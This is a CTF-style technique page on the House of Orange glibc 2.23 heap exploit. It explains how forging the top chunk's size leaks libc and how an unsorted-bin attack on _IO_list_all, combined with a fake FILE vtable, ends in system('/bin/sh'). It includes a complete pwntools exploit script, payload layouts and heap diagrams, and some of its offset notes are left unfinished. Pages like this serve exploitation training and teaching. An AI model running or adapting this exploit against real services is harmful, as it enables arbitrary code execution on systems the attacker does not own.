---
title: "House of Orange - No free(), Top Chunk to FSOP Shell"
category: pwn
subcategory: heap
type: technique
tags: [house-of-orange, top-chunk, sysmalloc, unsorted-bin, unsorted-bin-attack, io-list-all, fsop, vtable, io-flush-all-lockp, abort, libc-leak, pwndbg, gef, pwntools, glibc]
difficulty: insane
summary: "Shrink the top chunk so sysmalloc frees it into the unsorted bin, leak libc, then unsorted-bin-attack _IO_list_all and get a shell through a fake FILE vtable."
when_to_use:
  - "The challenge has malloc and edit but NO free at all"
  - "glibc 2.23 (the vtable check in 2.24 and the unsorted hardening in 2.29 break it)"
  - "You can overflow into the top chunk's size field"
  - "You need both a libc leak and code execution from a single primitive"
tools: [pwntools, pwndbg, gef]
related: [house-force, heap-unsorted-bin-attack, heap-fsop-file-struct, house-of-apple, heap-unsorted-bin-leak]
---

## TL;DR

Two halves. First: corrupt `top->size` to something small and page-aligned, then
`malloc` more than the top has left - `sysmalloc` calls `_int_free` on the old top,
which lands in the unsorted bin and gives you a libc **and** heap leak with no `free()`
in the binary. Second: unsorted-bin-attack `_IO_list_all`, forge a `_IO_FILE` in a
smallbin chunk, and let the next `malloc` error call `abort()` ->
`_IO_flush_all_lockp` -> your vtable -> `system("/bin/sh")`.

## Recognise it

- The menu has `create` and `edit` but **no delete**. That is the signature.
- The overflow reaches the top chunk (your chunk is the last one).
- glibc 2.23 (Ubuntu 16.04). `strings libc.so.6 | grep "GNU C Library"`.
- No leak is offered anywhere - House of Orange manufactures its own.

## Vulnerable code shape

```c
static char *cur;
static size_t cur_len;

void do_create(void) {
    size_t n = read_size();
    cur = malloc(n);
    cur_len = n;
    read(0, cur, n);
}

void do_edit(void) {
    size_t n = read_size();      /* BUG: new length not bounded by cur_len */
    read(0, cur, n);             /* overflows into the top chunk header */
}
/* NOTE: there is no do_delete(). */
```

## Theory

Targets: glibc 2.23 only. 2.24 added `IO_validate_vtable`; 2.29 added
`malloc(): corrupted top size` and the unsorted-bin `bck->fd != victim` check. Any of
those three kills a different stage.

### Stage 1: making the top chunk free itself

When `_int_malloc` cannot satisfy a request from any bin or from the top, it calls
`sysmalloc`. In `sysmalloc`, if the arena is the main arena and `MORECORE` extends the
heap, the *old* top chunk is released:

```c
if (old_size >= MINSIZE)
  {
    ...
    set_head (old_top, (old_size - 2 * SIZE_SZ) | PREV_INUSE);
    ...
    _int_free (av, old_top, 1);
  }
```

Guarded by, earlier in `sysmalloc`:

```c
assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse (old_top) &&
         ((unsigned long) old_end & (pagesize - 1)) == 0));
```

So the forged `top->size` must satisfy:

1. `old_size >= MINSIZE` (0x20).
2. `prev_inuse(old_top)` - keep bit 0 set.
3. `(old_top + old_size) % 0x1000 == 0` - the top chunk must end on a page boundary.

If the heap starts at a page boundary and your chunk layout is known, pick
`fake_top_size = 0xFA1` or similar so that `top_addr + size` is page aligned. A common
value when the top sits at `heap + 0x60` after a 0x10-byte chunk is `0xfa1`
(0xfa0 + PREV_INUSE), but **compute it**: `size = 0x1000 - (top_addr & 0xFFF) + k*0x1000`.

Then `malloc(0x1000)` (bigger than the remaining top). `sysmalloc` extends the heap and
frees the old top: a ~0xFA0 chunk enters the unsorted bin.

Now `malloc(0x400)` carves a smallbin-sized piece from that unsorted chunk; the
remainder gets sorted into `smallbin[...]`. The chunk you just got back still contains
the `fd`/`bk` from the unsorted bin -> **libc leak** (and its `fd_nextsize` region, once
it has been in a largebin, gives a **heap leak**).

### Stage 2: unsorted bin attack on `_IO_list_all`

The remainder chunk is in the unsorted bin with `bk` pointing at `main_arena+0x58`
(2.23 layout). Overwrite `bk` with `&_IO_list_all - 0x10`. The next `malloc` walks the
unsorted bin and executes `bck->fd = unsorted_chunks(av)`, writing
`main_arena + 0x58` into `_IO_list_all`.

That value is not a real FILE - but the beauty of House of Orange is that
`main_arena + 0x58` reinterpreted as an `_IO_FILE` has its `_chain` field
(offset 0x68) landing on `main_arena + 0xC0`, which is **`smallbin[4]`**. And
`smallbin[4]` holds the chunk you just sorted there. So:

```
_IO_list_all -> main_arena+0x58 (fake FILE #1, fails the flush test)
                  ->_chain = smallbin[4] head = YOUR CHUNK
```

Your chunk is a `_IO_FILE` you fully control.

### Stage 3: the abort

The same `malloc` that performed the unsorted bin attack then finds the bin corrupted
and calls `malloc_printerr` -> `__libc_message` -> `abort()` -> `_IO_cleanup` ->
`_IO_flush_all_lockp`. That walks `_IO_list_all`, reaches your fake FILE, checks
`_IO_write_ptr > _IO_write_base`, and calls `_IO_OVERFLOW(fp, EOF)` =
`fp->vtable->__overflow(fp, EOF)`.

On 2.23 the vtable can point at the heap. Put `system` at `vtable + 0x18` and
`"/bin/sh\0"` at `fp + 0` (the `_flags` field) and you get `system("/bin/sh")`.

Required fields in the fake FILE:

| offset | field | value |
|--------|-------|-------|
| 0x00 | `_flags` | `b"/bin/sh\x00"` |
| 0x08 | `_IO_read_ptr` | the smallbin size, i.e. `0x61` when it is the chunk's own size field... (see layout) |
| 0x20 | `_IO_write_base` | 2 |
| 0x28 | `_IO_write_ptr` | 3 (must be `>` write_base) |
| 0x68 | `_chain` | 0 |
| 0x88 | `_lock` | a writable zeroed address |
| 0xC0 | `_mode` | 0 |
| 0xD8 | `vtable` | address of your fake vtable |
| vtable+0x18 | `__overflow` | `system` |

## Attack

1. `create(0x18)` -> chunk A. The top chunk follows immediately.
2. `edit(0x18 + 0x10 + 8)` writing `b"A"*0x18 + p64(0) + p64(FAKE_TOP_SIZE)`.
   `FAKE_TOP_SIZE` must make `top_addr + size` page aligned, e.g. `0xFA1`.
3. `create(0x1000)` - `sysmalloc` frees the old top into the unsorted bin, then
   `mmap`s/extends for the real request.
4. `create(0x400)` - carves from the freed old top. The returned chunk still holds the
   old `fd`/`bk`: read them -> `main_arena + 0x58` -> **libc base**.
   Read further -> a heap pointer -> **heap base**.
5. The remainder (~0xB00) is now in the unsorted bin, and after step 4's sorting the
   0x400-ish piece is in `smallbin[...]`.
6. `edit()` the chunk from step 4 to lay out, in one write:
   - padding up to the remainder chunk's header
   - `prev_size`, `size = 0x61` (so it sorts into `smallbin[4]`, whose head is at
     `main_arena + 0xC0` = `fake_file_1->_chain`)
   - `fd = 0`, `bk = &_IO_list_all - 0x10`
   - the rest of the fake `_IO_FILE` fields listed above
   - the fake vtable with `system` at `+0x18`
7. `create(0x10)` (any size) - `_int_malloc` walks the unsorted bin:
   - `bck->fd = unsorted_chunks(av)` -> `_IO_list_all = main_arena + 0x58`
   - the bin is now inconsistent -> `malloc_printerr` -> `abort()`
8. `abort()` -> `_IO_flush_all_lockp` -> your FILE -> `system("/bin/sh")`.

## Heap state

```text
step 1-2

  heap +0x000 | A: size 0x21 |
       +0x020 | TOP: prev_size |
       +0x028 | TOP: size = 0x20fd1  ->  forged to 0xfa1 |
                        ^ top_addr(0x020) + 0xfa0 = 0xfc0 ... must be page aligned
                        (compute: size = 0x1000 - (top_addr & 0xfff) - 0x?  )

step 3: create(0x1000)

  sysmalloc: old_size(0xfa0) >= MINSIZE, prev_inuse set, old_end page aligned
             -> _int_free(av, old_top, 1)
  unsorted bin: [0xfa0 chunk at heap+0x020]

step 4: create(0x400)

  the 0xfa0 chunk is split: 0x410 to us, 0xb90 remainder back to unsorted.
  our chunk's first 0x10 bytes still hold:
      fd = main_arena + 0x58     <- LIBC LEAK
      bk = main_arena + 0x58
  and after the sort, the remainder's fd_nextsize region holds a heap pointer.

step 6: forge, through our 0x410 chunk, the remainder's header and body

  remainder +0x000 | prev_size                      |
            +0x008 | size = 0x61                    |  -> smallbin[4]
            +0x010 | fd = 0                         |
            +0x018 | bk = &_IO_list_all - 0x10      |  <- unsorted bin attack
            +0x020 | _IO_write_base = 2             |
            +0x028 | _IO_write_ptr  = 3             |
            +0x068 | _chain = 0                     |
            +0x088 | _lock = &writable_zero         |
            +0x0c0 | _mode = 0                      |
            +0x0d8 | vtable = &fake_vtable          |
  fake_vtable +0x18 | system                        |
  remainder +0x000 (the _flags field) = "/bin/sh\0"

step 7: malloc()

  unsorted walk:  bck = victim->bk = &_IO_list_all - 0x10
                  bck->fd = unsorted_chunks(av)
                  => _IO_list_all = main_arena + 0x58
  then the bin is inconsistent -> malloc_printerr -> abort()

step 8: abort -> _IO_flush_all_lockp

  fp = _IO_list_all = main_arena + 0x58     (fake FILE #1)
       _IO_write_ptr <= _IO_write_base      -> skipped
       fp = fp->_chain  ( = *(main_arena + 0x58 + 0x68) = smallbin[4] head )
          = OUR chunk
       _IO_write_ptr(3) > _IO_write_base(2) -> selected
       _IO_OVERFLOW(fp, EOF) = *(fp->vtable + 0x18)(fp, EOF)
                             = system("/bin/sh")
```

## Exploit

```python
#!/usr/bin/env python3
"""House of Orange - glibc 2.23 only.

Stage 1: forge top->size, force sysmalloc to free the old top -> libc + heap leak.
Stage 2: unsorted bin attack on _IO_list_all + a fake _IO_FILE in smallbin[4].
Stage 3: the failing malloc aborts -> _IO_flush_all_lockp -> system("/bin/sh").

Usage:
    ./exploit.py
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

# glibc 2.23: unsorted bin head is main_arena + 0x58
ARENA_UNSORTED_OFF = 0x58


def page_aligned_top_size(top_addr: int, pages: int = 1) -> int:
    """Smallest size making top_addr + size land on a page boundary, PREV_INUSE set."""
    size = (pages * 0x1000) - (top_addr & 0xFFF)
    while size < 0x20:
        size += 0x1000
    return size | 1


def build_fake_file(vtable_addr: int, lock_addr: int) -> bytes:
    """The fake _IO_FILE body, starting at the chunk's _flags (== chunk+0x10... see below).

    Returned blob starts at offset 0x00 of the FILE, i.e. the chunk's user area
    minus 0x10 because we reuse the chunk header as _flags/_IO_read_ptr.
    """
    buf = bytearray(0xE0)
    buf[0x00:0x08] = b"/bin/sh\x00"        # _flags  -> rdi for system()
    buf[0x20:0x28] = p64(2)                # _IO_write_base
    buf[0x28:0x30] = p64(3)                # _IO_write_ptr  ( > base )
    buf[0x68:0x70] = p64(0)                # _chain
    buf[0x88:0x90] = p64(lock_addr)        # _lock -> writable zeroed memory
    buf[0xC0:0xC4] = b"\x00\x00\x00\x00"   # _mode = 0
    buf[0xD8:0xE0] = p64(vtable_addr)      # vtable
    return bytes(buf)


io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def create(size, data=b"A"):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"content: ", data)


def edit(size, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"content: ", data)


def show():
    io.sendlineafter(b"> ", b"3")
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


# ----------------------------------------------- stage 1: free the top chunk
create(0x18, b"A" * 8)
# Top chunk sits right after our 0x20 chunk. Measure the offset once in gdb.
TOP_IN_PAGE = 0x20                       # (top_addr & 0xfff) after the first malloc
fake_top = page_aligned_top_size(TOP_IN_PAGE)
log.info("forged top size = %#x", fake_top)

edit(0x28, b"A" * 0x18 + p64(0) + p64(fake_top))
create(0x1000, b"trigger")               # sysmalloc frees the old top

# ----------------------------------------------- stage 1b: the leaks
create(0x400, b"B" * 8)                  # carved from the freed old top
raw = show()
libc_leak = u64(raw.ljust(8, b"\x00")[:8])
libc.address = libc_leak - ARENA_UNSORTED_OFF - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

edit(0x18, b"B" * 0x10)                  # push the read pointer past fd/bk
heap_leak = u64(show()[0x10:0x18].ljust(8, b"\x00"))
heap_base = heap_leak & ~0xFFF
log.success("heap page = %#x", heap_base)

# ----------------------------------------------- stage 2: forge everything
io_list_all = libc.sym["_IO_list_all"]
system = libc.sym["system"]
log.info("_IO_list_all = %#x  system = %#x", io_list_all, system)

# The fake vtable lives right after the fake FILE, inside the same write.
REMAINDER_OFF = 0x410                    # distance from our chunk's data to the remainder
vtable_addr = heap_base + REMAINDER_OFF + 0xE8
lock_addr = heap_base + 0x10             # any writable zeroed address

payload = b"A" * (REMAINDER_OFF - 0x10)  # pad up to the remainder's header
payload += p64(0)                        # remainder prev_size
payload += p64(0x61)                     # remainder size -> smallbin[4]
payload += p64(0)                        # fd
payload += p64(io_list_all - 0x10)       # bk  -> the unsorted bin attack
payload += build_fake_file(vtable_addr, lock_addr)[0x20:]   # rest of the FILE
payload += p64(0) * 3 + p64(system)      # fake vtable: __overflow at +0x18

edit(len(payload), payload)
log.info("fake FILE + vtable staged")

# ----------------------------------------------- stage 3: detonate
create(0x10, b"boom")                    # unsorted walk -> write -> abort -> FSOP
io.interactive()
```

## Variants & pitfalls

- **Page alignment is the whole stage-1 puzzle.** `(top_addr + fake_size) & 0xFFF`
  must be 0. Print `main_arena.top` in gdb and do the arithmetic there.
- **`malloc(): corrupted top size` (2.29+)** - stage 1 is dead. Nothing to salvage.
- **`Fatal error: glibc detected an invalid stdio handle` (2.24+)** - stage 3 is dead;
  the vtable must live inside `__libc_IO_vtables`. Use `house-of-apple` instead.
- **`malloc(): corrupted unsorted chunks 3` (2.29+)** - stage 2 is dead too.
- **`_IO_list_all` layout assumption.** `main_arena + 0x58 + 0x68` must land on
  `smallbin[4]`'s head. If your libc's `main_arena` layout differs (it does from 2.27,
  which added `have_fastchunks`), recompute which smallbin index the `_chain` field
  hits and size your fake chunk accordingly.
- **`_lock`** must point at writable zeroed memory or `abort()` deadlocks/segfaults
  before reaching your vtable.
- **`_IO_write_ptr > _IO_write_base`** with both being small integers (2 and 3) is the
  classic; anything satisfying the inequality works.
- **The first fake FILE (`main_arena+0x58`) is skipped**, by design - its
  `_IO_write_ptr`/`_IO_write_base` are arena fields that do not satisfy the test. If
  they accidentally do, the flush calls into `main_arena`'s garbage vtable and crashes.

## Debugging

```text
pwndbg> top_chunk
pwndbg> p main_arena.top
pwndbg> p/x (long)main_arena.top & 0xfff
pwndbg> bins
pwndbg> p _IO_list_all
pwndbg> p *(struct _IO_FILE_plus*)<fake_file>
pwndbg> b _IO_flush_all_lockp
pwndbg> b malloc_printerr
pwndbg> vis_heap_chunks 30
gef>  heap bins
```

```bash
# Confirm this is really a 2.23 challenge.
strings ./libc.so.6 | grep -m1 "GNU C Library"
strings ./libc.so.6 | grep -c "corrupted top size"      # 0 => stage 1 alive
strings ./libc.so.6 | grep -c "invalid stdio handle"    # 0 => stage 3 alive
```

## Tools

- `pwndbg` with `libc6-dbg` so `p *(struct _IO_FILE_plus*)` works.
- `how2heap house_of_orange.c` - run it against the exact libc first.

## References

- shellphish `how2heap`: `house_of_orange.c`.
- glibc `malloc/malloc.c` (`sysmalloc`), `libio/genops.c` (`_IO_flush_all_lockp`).
- CTF Wiki, "House of Orange".
